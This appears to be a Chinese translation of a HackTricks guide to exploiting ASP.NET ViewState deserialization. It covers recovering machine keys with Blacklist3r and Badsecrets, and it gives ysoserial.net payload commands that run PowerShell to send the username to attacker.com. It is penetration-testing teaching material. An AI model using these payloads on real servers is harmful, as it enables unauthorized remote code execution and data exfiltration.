# 利用 \_\_VIEWSTATE 参数而不知道密钥的方法

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS 红队专家）</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想看到您的 **公司在 HackTricks 中被广告** 或 **下载 PDF 版本的 HackTricks**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向 **HackTricks** 和 **HackTricks Cloud** 的 github 仓库提交 PR 来分享您的黑客技巧。

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

如果您对 **黑客职业** 感兴趣并想要黑掉无法黑掉的东西 - **我们正在招聘！**（需要流利的波兰语书面和口语能力）。

{% embed url="https://www.stmcyber.com/careers" %}

## ViewState 是什么

**ViewState** 在 ASP.NET 中作为默认机制，用于在网页之间保持页面和控件数据。在渲染页面的 HTML 时，页面的当前状态和在 postback 期间需要保留的值被序列化为 base64 编码的字符串。然后将这些字符串放入隐藏的 ViewState 字段中。

ViewState 信息可以通过以下属性或它们的组合来描述：

- **Base64**:
- 当 `EnableViewStateMac` 和 `ViewStateEncryptionMode` 属性都设置为 false 时使用此格式。

- **Base64 + 启用 MAC（消息认证码）**:
- 通过将 `EnableViewStateMac` 属性设置为 true 来激活 MAC。这为 ViewState 数据提供了完整性验证。

- **Base64 + 加密**:
- 当 `ViewStateEncryptionMode` 属性设置为 true 时应用加密，确保 ViewState 数据的机密性。

## 测试案例

该图表详细说明了基于 .NET 框架版本的 ASP.NET 中 ViewState 的不同配置。以下是内容摘要：

1. 对于 **任何版本的 .NET**，当 MAC 和加密都被禁用时，不需要 MachineKey，因此没有适用的方法来识别它。

2. 对于 **4.5 版本以下的版本**，如果启用了 MAC 但未启用加密，则需要 MachineKey。用于识别 MachineKey 的方法称为 "Blacklist3r"。

3. 对于 **4.5 版本以下的版本**，无论 MAC 是否启用，如果启用了加密，则需要 MachineKey。识别 MachineKey 是 "Blacklist3r - 未来发展" 的任务。

4. 对于 **4.5 及以上版本**，MAC 和加密的所有组合（无论两者是否为 true，或其中一个为 true 另一个为 false）都需要 MachineKey。可以使用 "Blacklist3r" 来识别 MachineKey。


### 测试案例：1 – EnableViewStateMac=false 和 viewStateEncryptionMode=false

也可以通过在以下位置将 `AspNetEnforceViewStateMac` 注册表键设置为零来完全禁用 ViewStateMAC。
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**识别ViewState属性**

您可以尝试通过使用BurpSuite捕获包含此参数的请求来识别是否使用MAC保护了ViewState。如果未使用Mac来保护参数，则可以使用[YSoSerial.Net](https://github.com/pwntester/ysoserial.net)来利用它。
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### 测试案例 1.5 – 类似于测试案例 1，但服务器未发送 ViewState cookie

开发人员可以**移除 ViewState**，使其不成为 HTTP 请求的一部分（用户将不会收到此 cookie）。\
有人可能会认为，如果**ViewState**不存在，他们的实现就不会受到 ViewState 反序列化可能带来的任何潜在漏洞的影响。\
然而，事实并非如此。如果我们**向请求体添加 ViewState 参数**并发送使用 ysoserial 创建的序列化有效负载，我们仍然可以实现**代码执行**，就像**案例 1**中所示。


### 测试案例: 2 – .Net < 4.5 且 EnableViewStateMac=true & ViewStateEncryptionMode=false

为了为**特定页面启用 ViewState MAC**，我们需要对特定的 aspx 文件进行以下更改：
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
我们也可以通过在**web.config**文件中进行如下设置来针对**整个**应用程序执行此操作：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
由于参数受MAC保护，为了成功执行攻击，我们首先需要使用的密钥。

您可以尝试使用 [**Blacklist3r(AspDotNetWrapper.exe)**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) 来查找使用的密钥。
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) 是另一个可以识别已知 machineKeys 的工具。它是用 Python 编写的，因此与 Blacklist3r 不同，它没有 Windows 依赖性。对于 .NET viewstates，有一个名为 "python blacklist3r" 的实用程序，这是使用它的最快方式。

它可以直接提供 viewstate 和生成器：
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
![https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

或者，它可以直接连接到目标URL，并尝试从HTML中提取viewstate：
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

要在规模上搜索易受攻击的viewstates，可以结合子域枚举，使用`badsecrets` [**BBOT**](exploiting-\_\_viewstate-parameter.md) 模块：
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

如果你很幸运找到了密钥，你可以使用 [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:**
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
在服务器**未发送**`_VIEWSTATEGENERATOR`参数的情况下，您**无需**提供`--generator`参数**但这些参数**：
```bash
--apppath="/" --path="/hello.aspx"
```
### 测试案例：3 – .Net < 4.5 和 EnableViewStateMac=true/false 以及 ViewStateEncryptionMode=true

在这种情况下，不清楚参数是否受到 MAC 保护。因此，该值可能已加密，您将**需要机器密钥来加密您的有效负载**以利用漏洞。

**在这种情况下**，[**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **模块正在开发中...**

**在.NET 4.5之前**，即使**`ViewStateEncryptionMode`**已设置为_**Always**_，ASP.NET也可以从用户那里**接受**一个**未加密的**\_`__VIEWSTATE`\_参数。ASP.NET**仅检查**请求中**`__VIEWSTATEENCRYPTED`**参数的**存在**。**如果删除此参数并发送未加密的有效负载，则仍将被处理。**

因此，如果攻击者找到另一个漏洞（如文件遍历）来获取机器密钥，[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) 命令在**案例2**中使用，可用于利用 ViewState 反序列化漏洞执行 RCE。

* 从请求中删除`__VIEWSTATEENCRYPTED`参数以利用 ViewState 反序列化漏洞，否则将返回 Viewstate MAC 验证错误，利用将失败。

### 测试案例：4 – .Net >= 4.5 和 EnableViewStateMac=true/false 以及 ViewStateEncryptionMode=true/false 除非两个属性均设置为 false

我们可以通过在 web.config 文件中指定以下参数来强制使用 ASP.NET 框架。
```xml
<httpRuntime targetFramework="4.5" />
```
或者，可以通过在web.config文件的`machineKey`参数中指定以下选项来完成。
```bash
compatibilityMode="Framework45"
```
与之前一样，数值是加密的。然后，为了发送有效的有效载荷，攻击者需要密钥。

您可以尝试使用[**Blacklist3r(AspDotNetWrapper.exe)**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)来查找正在使用的密钥：
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
请参考[IISDirPath和TargetPagePath的更详细描述](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

或者，使用[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets)（带有生成器值）:
```bash
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
![https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

一旦确定了有效的Machine key，**下一步是使用** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) **生成序列化的有效载荷**
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
如果您拥有`__VIEWSTATEGENERATOR`的值，可以尝试**使用**该值与`--generator`参数，并**省略**`--path`和`--apppath`参数。

![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2019/06/4.2.png)

成功利用ViewState反序列化漏洞将导致向受攻击者控制的服务器发出带有用户名的带外请求。这种利用漏洞的示例已在一个名为“Exploiting ViewState Deserialization using Blacklist3r and YsoSerial.NET”的资源中展示。要了解利用过程的详细信息以及如何使用Blacklist3r等工具来识别MachineKey，您可以查看提供的[成功利用的PoC](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC)。

### 测试案例6 – 正在使用ViewStateUserKeys

**ViewStateUserKey**属性可用于**防御****CSRF攻击**。如果应用程序中已定义了这样一个密钥，并且我们尝试使用到目前为止讨论的方法生成**ViewState**载荷，则**应用程序不会处理该载荷**。\
您需要使用一个额外的参数来正确创建载荷：
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### 成功利用的结果 <a href="#poc" id="poc"></a>

对于所有测试案例，如果 ViewState YSoSerial.Net 负载成功运行，则服务器将以“**500 内部服务器错误**”的形式响应，响应内容为“**此页面的状态信息无效，可能已损坏**”，并且我们会收到 OOB 请求。

查看[更多信息请点击这里]([**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/))

## 参考资料

* [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
* [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)\\
* [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

如果您对**黑客职业**感兴趣并想要攻破不可攻破的 - **我们正在招聘！**（需要流利的波兰语书面和口语能力）。

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS 红队专家）</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 HackTricks 中看到您的**公司广告**或**下载 PDF 版本的 HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) 上 **关注**我。
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>
